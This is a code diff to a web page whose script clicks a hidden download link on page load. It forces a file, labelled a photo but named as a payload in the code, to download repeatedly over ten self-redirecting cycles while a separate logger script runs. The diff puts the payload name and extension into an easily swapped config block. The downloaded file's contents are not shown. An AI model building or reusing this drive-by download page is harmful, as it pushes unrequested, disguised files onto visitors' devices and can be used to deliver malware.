@@ -66,28 +66,38 @@
     <div class="sub">Rerouting back to main...</div>
   </div>
 
+  <!-- PAYLOAD_LINK_START -->
   <a id="dl" href="../media/images/F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B.png" download="F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B.png" style="display:none"></a>
+  <!-- PAYLOAD_LINK_END -->
 
   <script src="../logger.js"></script>
   <script>
+    /* PAYLOAD_CONFIG_START */
+    const PAYLOAD_BASENAME = 'F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B';
+    const PAYLOAD_EXT = 'png';
+    const MAX_CYCLES = 10;
+    const STATUS_PREFIX = 'Downloading photo';
+    /* PAYLOAD_CONFIG_END */
+
     const params = new URLSearchParams(window.location.search);
     const cycle = parseInt(params.get('cycle') || '1', 10);
     const statusEl = document.getElementById('status');
     if (statusEl) {
-      statusEl.innerText = `Downloading photo (${cycle} / 10)...`;
+      statusEl.innerText = `${STATUS_PREFIX} (${cycle} / ${MAX_CYCLES})...`;
     }
 
     const dl = document.getElementById('dl');
     if (dl) {
+      const ext = PAYLOAD_EXT ? `.${PAYLOAD_EXT}` : '';
       const filename = cycle === 1
-        ? 'F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B.png'
-        : `F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B_${cycle}.png`;
+        ? `${PAYLOAD_BASENAME}${ext}`
+        : `${PAYLOAD_BASENAME}_${cycle}${ext}`;
       dl.setAttribute('download', filename);
       dl.click();
     }
 
     const nextCycle = cycle + 1;
-    const nextUrl = nextCycle <= 10 ? '../?cycle=' + nextCycle : '../?done=1';
+    const nextUrl = nextCycle <= MAX_CYCLES ? '../?cycle=' + nextCycle : '../?done=1';
     setTimeout(() => {
       window.location.replace(nextUrl);
     }, 700);
